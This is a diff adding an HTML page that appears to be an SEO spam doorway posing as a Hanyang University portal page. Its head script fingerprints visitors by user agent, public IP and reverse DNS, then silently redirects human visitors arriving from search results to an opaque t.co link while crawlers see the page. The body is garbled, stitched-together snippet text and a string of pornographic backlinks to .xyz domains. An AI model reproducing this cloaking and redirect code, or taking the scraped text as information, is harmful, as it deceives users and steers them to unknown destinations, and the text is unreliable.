@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>8002</title>
+</script>
+</head>
+<body>
+<h1>한양대학교포털</h1>
+<p>한양대학교 HY-in. Welcome to HY-in. Hanyang University Portal Service. PORTAL. PORTAL Visual. Course Registration. HY2B. Course Registration ...한양대 · 광장 · 한양위키 · 뉴스H · HY-in · 학부모/가족 · 기부하기 · 사이트맵 · KO · EN · CN. 검색. search open. 검색. 검색. #캠퍼스 가이드북 #등록금 분할 ...2022-03-17 — 한양대학교 포털은 학생들을 위해 많은 정보를 제공하고 있다. 특히 [서비스 바로가기]는 핵심 정보를 모아둔 만큼 숨겨진 '꿀 정보'가 많다.클라우드 알파카 납 축전지 한양대학교 포털은 학생들을 위해 많은 정보를 제공하고 있다. 특히 서비스 바로가기는 핵심 정보를 모아둔 만큼 숨겨진 꿀 정보가 많다 한양 ...Nepasiekiama jokia šio puslapio informacija.한양대학교 한양인 · 로그인 Hanyang university portal service · IP보안 Hanyang university portal service · 로그인 안내 Hanyang university portal service.여러분이 지금 수강신청이나 콘서트 티켓팅으로 확인하고 있는 한양대학교 수강신청 사이트(portal.hanyang.ac.kr)의 서버가 갖고 있는 고유한 서버시간을 언제나 가장 ...한양대학교 · 한양대학교 포털 · 한양대학교 HY-ON (LMS) · 백남학술정보관. 주소 : (04763) 서울특별시 성동구 왕십리로 222 한양대학교 학생회관 4층 총학생회실.한양대학교 학우 여러분들의 의견에 귀를 기울이는 학생회가 되겠습니다. ... 한양대학교 · 한양대학교 포털 · 한양대학교 HY-ON (LMS) · 백남학술정보관. 고객센터.한양사이버대학교는 4년제 종합대학으로 실무중심의 10개 학부, 36개 학과, 대학원과정(5개대학원 14개전공)을 운영합니다.2020-02-25 — 저는 한양인 포털 매일 들어가서 여기서 좋은 아르바이트도 구하고 강연도 신청하고 선물도 받고 정말 혜택 많이 받았어요!! 고등학교와 달리 대학교 ...MATLAB 및 Simulink 관련 서적. 강사, 학생, 전문가를 위한 2000권 이상의 서적. 자세히 알아보기. 이 페이지를 공유합니다. Share.우리 학교 국제대학원은 한국국제협력단(KOICA)이 개발도상국의 에너지 정책 분야 전문가 육성을 위해 개설한 KOICA 에너지정책 석사학위과정 연수사업을 운영해왔다. 지난 ...대학어디가TV tvicon ... [수시] 2024학년도 수시모집 의약계열 지역인재 선발 비율은? ... [대입뉴스] [정시] 서울대학교, 올해부터 정시모집 과탐Ⅱ 과목 필수 응시 조건 ...주관기관 : 한양대학교 교육혁신팀 (04763) 서울특별시 성동구 왕십리로 222 | TEL. 02.2220.1455. Copyright c 2023 대학 e-러닝 기반 학점인정 컨소시엄.한양대학교 수강신청. 수강신청 – 한양대학교 포털. 현재 로그인되어 있지 않습니다. 로그인 언어 설정. 과정 안내; 코스 매뉴얼. 수강신청 – 한양대학교. 등록.대한민국 No.1 증명발급 포털 · 증명서발급 · 원본확인 · 이용안내 · 고객센터. 증명서발급; CERTIFICATE ISSUED; 웹민원센터를 통해 언제, 어디서든 증명서를 발급 ...BioINpro 개인 맞춤형 암백신 현재와 미래 개인 맞춤형 암백신 현재와 미래남진우/ 한양대학교 교수, 한양생명과학기술원 부원장 ◈ 목차1. 암백신의 개념2.한양 대학교 포털 [c406]. 사진&amp;영상 is oahu in honolulu. 다양하고 복잡해진 현대 사회에서 필요한 상담심리 능력 배양. Web2017학년도 수시2차 원서접수.한양위키 #12   등교가 아닌 등산은 이제 그만!! 한양대학교 '포탈' 지름길   8 months ago Hanyang University한양대학교 · [사자캐스트] 한양대학교 포털타기.한양 대학교 포털 [a30a]. 한양여자대학교 Home Facebook. 종합정보시스템과 동일하게 입력하세요. WebIP주소 정보의 사용범위를 사용자의 인터넷 접속 환경에 맞게 3 ...[e171] 한양 대학교 포털 골드 메달 복지사회를 선도하는 열린 교육을 통해 사회문제 예방 및 해결. 다양한 학문을 접할 수 있는 다중전공을 권장.숙명포털 아이디는 학번(7자리)과 교직원번호(5자리)로 구성되어 있습니다. ... 경희대학교 도서관; 고려대학교 도서관; 성균관대학교 도서관; 한양대학교 도서관; ...104177.170 host name portal.hanyang.ac. Last updated on . 한양대학교 도시대학원은 일반대학원과 차별화하여, 대학원 또는 학과 단위로 모의도시개발 Work shop, ...prieš 8 valandas — 공주 대학교 포털 시스템 파일 전자정부법에 의거 교직원(정보시스템을 이용 ... 포털을' 통해 신청할 수 있다 kr)과 통계청 국가통계포털(kosis 한양 ...prieš 9 valandas — 2023 — ac hanyang kr learn. ac; MCDM LAB – 한양대학교 MCDM 연구원 ... 형 학습이나 토론 보다는 강의자 …acum 1 oră — 한양대학교 포털 한양인 ...prieš 2 valandas — 인천 재능 대학교 포털 그룹웨어 · 대학포털 · 학생공지 · 학사일정 · 대학현황. ... PICK · PICK · 이경일 솔트룩스 대표이사, 한양대학교 특임교수, ...prieš 11 valandų — 한양COP; 3; 【동덕 여대 포털】 (G194HC) 개인정보처리방침| 이화여자대학교 | 이화 …1 ian. 2021 — 이화여자대학교 포탈 정보 시스템 (EWHA Portal ...prieš 6 valandas — 수강 방법은 수원과학대학교 포털 …5 mai 2023 — Search ID 주메뉴로 바로가기 본문내용 바로가기 ... 한양에서 대학 교육이 산업과 사회를 만납니다.prieš 15 valandų — 한양인 포털 및 교내정보 시스템 전체 서비스.한성대학교 종합정보시스템 수시등급 대학원 블랙보드. … 서울 한성여자고등학교 화이팅.2016학년도 ...한양인 포털 및 교내정보 시스템 전체 서비스. 한양인 (HY-in) 포털 및 교내정보에서 처리되는 전체 업무 (학사 / 행정 / 연구 / 입시) 사회교육원 / 국제교육원 ...안양대학교 포털시스템 portalanyang.ac.kr) 경희대학교 수강신청 ... 한양대학교수강신청서버시간 #한양대학교수강신청 #한양대학교서버시간 #한양대수강신청서버시간 ...prieš 16 valandų — 한양대학교 대학원 등록금 등록 절차와 등록금 납부 과정에 대해 ... HY-in 로그인 – 증명발급 – 포털증명발급(무료) – 대학/대학원 – (우측) …prieš 13 valandų — 서울 시립대 포털 서울시립대학교 포털시스템. ... 포털계정등록. 로그인 폼. 로그인. ... 한양에서 대학 교육이 산업과 사회를 만납니다.한양인 포털 인증 (SSO) 연계서비스 대표웹, 입학, 도서관, 이러닝, ... 시설이 매우 깨끗하다 대학/학과 소개 - 한양대학교 대학/학과 소개 공학과 인문학을 넘어 ...한양인 (HY-in) 포털 및 교내정보에서 처리되는 전체 업무 (학사 / 행정 / 연구 ... 한양대학교 올림픽체육관 (漢陽大學校 올림픽體育館)은 서울특별시 성동구 한양 ...prieš 1 dieną — 1 한양대 수시등급 정시 입결 경쟁률 등록금 한양대학교 에리카 2022 2. 14. ... 한양인 포털 인증 (SSO) 연계서비스 대표웹, 입학, 도서관, 이러닝, ...prieš 2 valandas — 2018 — 오늘은 휴대폰에서 경찰 사이버 교육 포털 어플을 설치하는법 ... 한동대학교; 한성대학교; 한세대학교; 한양사이버대학교; 한양여자대학교 …모든 자료의 출처는 대입정보포털이며, 해당 자료는 2023학년도 입시에 참고자료로만 사용하시기 바랍니다. 1. 한양대학교 입학처 (한양대 수시등급 정시 입결 경쟁률 ...한양인 (HY-in) 포털 및 교내정보에서 처리되는 전체 업무 (학사 / 행정 / 연구 ... 정시 2023학년도 한양대학교 비대면 한양대, 반도체 산업경쟁력 확보에 나서 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
